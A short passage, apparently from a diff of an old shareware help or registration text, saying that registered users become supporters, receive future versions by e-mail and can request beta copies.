+        <be upgraded to a supporter and future versions of the software will>
+        <be mailed through e-mail to you.  You will also receive beta copies>
+        <of the software, if you request for them.                          >
